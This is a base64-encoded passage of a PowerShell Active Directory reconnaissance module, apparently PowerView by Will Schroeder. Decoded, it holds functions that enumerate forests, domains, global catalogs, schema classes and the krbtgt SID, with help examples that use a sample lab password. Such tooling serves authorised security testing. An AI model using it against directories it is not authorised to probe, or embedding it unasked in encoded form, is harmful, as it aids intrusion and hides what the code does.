U0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUCddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CgogICAgICAgICAgICAjIFVBQyBzcGVjaWZpY2F0aW9uIGZvciBkb21haW4gY29udHJvbGxlcnMKICAgICAgICAgICAgJEFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJyh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9ODE5MiknCgogICAgICAgICAgICBHZXQtRG9tYWluQ29tcHV0ZXIgQEFyZ3VtZW50cwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEZvdW5kRG9tYWluID0gR2V0LURvbWFpbiBAQXJndW1lbnRzCiAgICAgICAgICAgIGlmICgkRm91bmREb21haW4pIHsKICAgICAgICAgICAgICAgICRGb3VuZERvbWFpbi5Eb21haW5Db250cm9sbGVycwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LUZvcmVzdCB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyB0aGUgZm9yZXN0IG9iamVjdCBmb3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZm9yZXN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBDb252ZXJ0VG8tU0lEICAKCi5ERVNDUklQVElPTgoKUmV0dXJucyBhIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRm9yZXN0IG9iamVjdCBmb3IgdGhlIGN1cnJlbnQKZm9yZXN0IG9yIHRoZSBmb3Jlc3Qgc3BlY2lmaWVkIHdpdGggLUZvcmVzdCBYLgoKLlBBUkFNRVRFUiBGb3Jlc3QKClRoZSBmb3Jlc3QgbmFtZSB0byBxdWVyeSBmb3IsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGZvcmVzdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGZvcmVzdC4KCi5FWEFNUExFCgpHZXQtRm9yZXN0IC1Gb3Jlc3QgZXh0ZXJuYWwuZG9tYWluCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LUZvcmVzdCAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QKCk91dHB1dHMgYSBQU09iamVjdCBjb250YWluaW5nIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRm9yZXN0IGluIGFkZGl0aW9uCnRvIHRoZSBmb3Jlc3Qgcm9vdCBkb21haW4gU0lELgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIGZvciBHZXQtRm9yZXN0IgoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsKICAgICAgICAgICAgICAgICRUYXJnZXRGb3Jlc3QgPSAkRm9yZXN0CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAjIGlmIG5vIGRvbWFpbiBpcyBzdXBwbGllZCwgZXh0cmFjdCB0aGUgbG9nb24gZG9tYWluIGZyb20gdGhlIFBTQ3JlZGVudGlhbCBwYXNzZWQKICAgICAgICAgICAgICAgICRUYXJnZXRGb3Jlc3QgPSAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLkRvbWFpbgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Gb3Jlc3RdIEV4dHJhY3RlZCBkb21haW4gJyRGb3Jlc3QnIGZyb20gLUNyZWRlbnRpYWwiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRGb3Jlc3RDb250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoJ0ZvcmVzdCcsICRUYXJnZXRGb3Jlc3QsICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRGb3Jlc3RPYmplY3QgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3RdOjpHZXRGb3Jlc3QoJEZvcmVzdENvbnRleHQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Gb3Jlc3RdIFRoZSBzcGVjaWZpZWQgZm9yZXN0ICckVGFyZ2V0Rm9yZXN0JyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QsIG9yIHRoZSBzcGVjaWZpZWQgY3JlZGVudGlhbHMgYXJlIGludmFsaWQ6ICRfIgogICAgICAgICAgICAgICAgJE51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsKICAgICAgICAgICAgJEZvcmVzdENvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRm9yZXN0JywgJEZvcmVzdCkKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRGb3Jlc3RPYmplY3QgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3RdOjpHZXRGb3Jlc3QoJEZvcmVzdENvbnRleHQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Gb3Jlc3RdIFRoZSBzcGVjaWZpZWQgZm9yZXN0ICckRm9yZXN0JyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3Q6ICRfIgogICAgICAgICAgICAgICAgcmV0dXJuICROdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICMgb3RoZXJ3aXNlIHVzZSB0aGUgY3VycmVudCBmb3Jlc3QKICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEN1cnJlbnRGb3Jlc3QoKQogICAgICAgIH0KCiAgICAgICAgaWYgKCRGb3Jlc3RPYmplY3QpIHsKICAgICAgICAgICAgIyBnZXQgdGhlIFNJRCBvZiB0aGUgZm9yZXN0IHJvb3QKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAkRm9yZXN0U2lkID0gKEdldC1Eb21haW5Vc2VyIC1JZGVudGl0eSAia3JidGd0IiAtRG9tYWluICRGb3Jlc3RPYmplY3QuUm9vdERvbWFpbi5OYW1lIC1DcmVkZW50aWFsICRDcmVkZW50aWFsKS5vYmplY3RzaWQKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRGb3Jlc3RTaWQgPSAoR2V0LURvbWFpblVzZXIgLUlkZW50aXR5ICJrcmJ0Z3QiIC1Eb21haW4gJEZvcmVzdE9iamVjdC5Sb290RG9tYWluLk5hbWUpLm9iamVjdHNpZAogICAgICAgICAgICB9CgogICAgICAgICAgICAkUGFydHMgPSAkRm9yZXN0U2lkIC1TcGxpdCAnLScKICAgICAgICAgICAgJEZvcmVzdFNpZCA9ICRQYXJ0c1swLi4kKCRQYXJ0cy5sZW5ndGgtMildIC1qb2luICctJwogICAgICAgICAgICAkRm9yZXN0T2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1Jvb3REb21haW5TaWQnICRGb3Jlc3RTaWQKICAgICAgICAgICAgJEZvcmVzdE9iamVjdAogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Gb3Jlc3REb21haW4gewo8IwouU1lOT1BTSVMKClJldHVybiBhbGwgZG9tYWlucyBmb3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZm9yZXN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRm9yZXN0ICAKCi5ERVNDUklQVElPTgoKUmV0dXJucyBhbGwgZG9tYWlucyBmb3IgdGhlIGN1cnJlbnQgZm9yZXN0IG9yIHRoZSBmb3Jlc3Qgc3BlY2lmaWVkCmJ5IC1Gb3Jlc3QgWC4KCi5QQVJBTUVURVIgRm9yZXN0CgpTcGVjaWZpZXMgdGhlIGZvcmVzdCBuYW1lIHRvIHF1ZXJ5IGZvciBkb21haW5zLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZm9yZXN0LgoKLkVYQU1QTEUKCkdldC1Gb3Jlc3REb21haW4KCi5FWEFNUExFCgpHZXQtRm9yZXN0RG9tYWluIC1Gb3Jlc3QgZXh0ZXJuYWwubG9jYWwKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRm9yZXN0RG9tYWluIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICAkQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsgJEFyZ3VtZW50c1snRm9yZXN0J10gPSAkRm9yZXN0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkRm9yZXN0T2JqZWN0ID0gR2V0LUZvcmVzdCBAQXJndW1lbnRzCiAgICAgICAgaWYgKCRGb3Jlc3RPYmplY3QpIHsKICAgICAgICAgICAgJEZvcmVzdE9iamVjdC5Eb21haW5zCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LUZvcmVzdEdsb2JhbENhdGFsb2cgewo8IwouU1lOT1BTSVMKClJldHVybiBhbGwgZ2xvYmFsIGNhdGFsb2dzIGZvciB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBmb3Jlc3QuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Gb3Jlc3QgIAoKLkRFU0NSSVBUSU9OCgpSZXR1cm5zIGFsbCBnbG9iYWwgY2F0YWxvZ3MgZm9yIHRoZSBjdXJyZW50IGZvcmVzdCBvciB0aGUgZm9yZXN0IHNwZWNpZmllZApieSAtRm9yZXN0IFggYnkgdXNpbmcgR2V0LUZvcmVzdCB0byByZXRyaWV2ZSB0aGUgc3BlY2lmaWVkIGZvcmVzdCBvYmplY3QKYW5kIHRoZSAuRmluZEFsbEdsb2JhbENhdGFsb2dzKCkgdG8gZW51bWVyYXRlIHRoZSBnbG9iYWwgY2F0YWxvZ3MuCgouUEFSQU1FVEVSIEZvcmVzdAoKU3BlY2lmaWVzIHRoZSBmb3Jlc3QgbmFtZSB0byBxdWVyeSBmb3IgZ2xvYmFsIGNhdGFsb2dzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Gb3Jlc3RHbG9iYWxDYXRhbG9nCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LUZvcmVzdEdsb2JhbENhdGFsb2cgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5Lkdsb2JhbENhdGFsb2cKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuR2xvYmFsQ2F0YWxvZycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgJEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICRBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJEZvcmVzdE9iamVjdCA9IEdldC1Gb3Jlc3QgQEFyZ3VtZW50cwoKICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICAkRm9yZXN0T2JqZWN0LkZpbmRBbGxHbG9iYWxDYXRhbG9ncygpCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LUZvcmVzdFNjaGVtYUNsYXNzIHsKPCMKLlNZTk9QU0lTCgpIZWxwZXIgdGhhdCByZXR1cm5zIHRoZSBBY3RpdmUgRGlyZWN0b3J5IHNjaGVtYSBjbGFzc2VzIGZvciB0aGUgY3VycmVudAoob3Igc3BlY2lmaWVkKSBmb3Jlc3Qgb3IgcmV0dXJucyBqdXN0IHRoZSBzY2hlbWEgY2xhc3Mgc3BlY2lmaWVkIGJ5Ci1DbGFzc05hbWUgWC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LUZvcmVzdCAgCgouREVTQ1JJUFRJT04KClVzZXMgR2V0LUZvcmVzdCB0byByZXRyaWV2ZSB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBmb3Jlc3QuIEJ5IGRlZmF1bHQsCnRoZSAuRmluZEFsbENsYXNzZXMoKSBtZXRob2QgaXMgZXhlY3V0ZWQsIHJldHVybmluZyBhIGNvbGxlY3Rpb24gb2YKW0RpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5BY3RpdmVEaXJlY3RvcnlTY2hlbWFDbGFzc10gcmVzdWx0cy4KSWYgIi1GaW5kQ2xhc3MgWCIgaXMgc3BlY2lmaWVkLCB0aGUgW0RpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5BY3RpdmVEaXJlY3RvcnlTY2hlbWFDbGFzc10KcmVzdWx0IGZvciB0aGUgc3BlY2lmaWVkIGNsYXNzIG5hbWUgaXMgcmV0dXJuZWQuCgouUEFSQU1FVEVSIENsYXNzTmFtZQoKU3BlY2lmaWVzIGEgQWN0aXZlRGlyZWN0b3J5U2NoZW1hQ2xhc3MgbmFtZSBpbiB0aGUgZm91bmQgc2NoZW1hIHRvIHJldHVybi4KCi5QQVJBTUVURVIgRm9yZXN0CgpUaGUgZm9yZXN0IHRvIHF1ZXJ5IGZvciB0aGUgc2NoZW1hLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBmb3Jlc3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LUZvcmVzdFNjaGVtYUNsYXNzCgpSZXR1cm5zIGFsbCBkb21haW4gc2NoZW1hIGNsYXNzZXMgZm9yIHRoZSBjdXJyZW50IGZvcmVzdC4KCi5FWEFNUExFCgpHZXQtRm9yZXN0U2NoZW1hQ2xhc3MgLUZvcmVzdCBkZXYudGVzdGxhYi5sb2NhbAoKUmV0dXJucyBhbGwgZG9tYWluIHNjaGVtYSBjbGFzc2VzIGZvciB0aGUgZXh0ZXJuYWwubG9jYWwgZm9yZXN0LgoKLkVYQU1QTEUKCkdldC1Gb3Jlc3RTY2hlbWFDbGFzcyAtQ2xhc3NOYW1lIHVzZXIgLUZvcmVzdCBleHRlcm5hbC5sb2NhbAoKUmV0dXJucyB0aGUgdXNlciBzY2hlbWEgY2xhc3MgZm9yIHRoZSBleHRlcm5hbC5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LUZvcmVzdFNjaGVtYUNsYXNzIC1DbGFzc05hbWUgdXNlciAtRm9yZXN0IGV4dGVybmFsLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgpSZXR1cm5zIHRoZSB1c2VyIHNjaGVtYSBjbGFzcyBmb3IgdGhlIGV4dGVybmFsLmxvY2FsIGRvbWFpbiB1c2luZwp0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpbRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkFjdGl2ZURpcmVjdG9yeVNjaGVtYUNsYXNzXQoKQW4gQWN0aXZlRGlyZWN0b3J5U2NoZW1hQ2xhc3MgcmV0dXJuZWQgZnJvbSB0aGUgZm91bmQgc2NoZW1hLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5BY3RpdmVEaXJlY3RvcnlTY2hlbWFDbGFzc10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0NsYXNzJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENsYXNzTmFtZSwKCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGb3Jlc3QsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgICRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgeyAkQXJndW1lbnRzWydGb3Jlc3QnXSA9ICRGb3Jlc3QgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRGb3Jlc3RPYmplY3QgPSBHZXQtRm9yZXN0IEBBcmd1bWVudHMKCiAgICAgICAgaWYgKCRGb3Jlc3RPYmplY3QpIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ2xhc3NOYW1lJ10pIHsKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDbGFzcyBpbiAkQ2xhc3NOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdC5TY2hlbWEuRmluZENsYXNzKCRUYXJnZXRDbGFzcykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRGb3Jlc3RPYmplY3QuU2NoZW1hLkZpbmRBbGxDbGFzc2VzKCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyIHsKPCMKLlNZTk9QU0lTCgpGaW5kcyB1c2VyL2dyb3VwL2NvbXB1dGVyIG9iamVjdHMgaW4gQUQgdGhhdCBoYXZlICdvdXRsaWVyJyBwcm9wZXJ0aWVzIHNldC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSwgTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluLCBHZXQtRG9tYWluVXNlciwgR2V0LURvbWFpbkdyb3VwLCBHZXQtRG9tYWluQ29tcHV0ZXIsIEdldC1Gb3Jlc3RTY2hlbWFDbGFzcyAgCgouREVTQ1JJUFRJT04KCkVudW1lcmF0ZXMgdGhlIHNjaGVtYSBmb3IgdGhlIHNwZWNpZmllZCAtQ2xhc3NOYW1lIChpZiBwYXNzZWQpIGJ5IHVzaW5nIEdldC1Gb3Jlc3RTY2hlbWFDbGFzcy4KSWYgYSAtUmVmZXJlbmNlT2JqZWN0IGlzIHBhc3NlZCwgdGhlIGNsYXNzIGlzIGV4dHJhY3RlZCBmcm9tIHRoZSBwYXNzZWQgb2JqZWN0LgpBICdyZWZlcmVuY2UnIHNldCBvZiBwcm9wZXJ0eSBuYW1lcyBpcyB0aGVuIGNhbGN1bGF0ZWQsIGVpdGhlciBmcm9tIGEgc3RhbmRhcmQgc2V0IHByZXNlcnZlZApmb3IgdXNlci9ncm91cC9jb21wdXRlcnMsIG9yIGZyb20gdGhlIGFycmF5IG9mIG5hbWVzIHBhc3NlZCB0byAtUmVmZXJlbmNlUHJvcGVydHlTZXQsIG9yCmZyb20gdGhlIHByb3BlcnR5IG5hbWVzIG9mIHRoZSBwYXNzZWQgLVJlZmVyZW5jZU9iamVjdC4gVGhlc2UgcHJvcGVy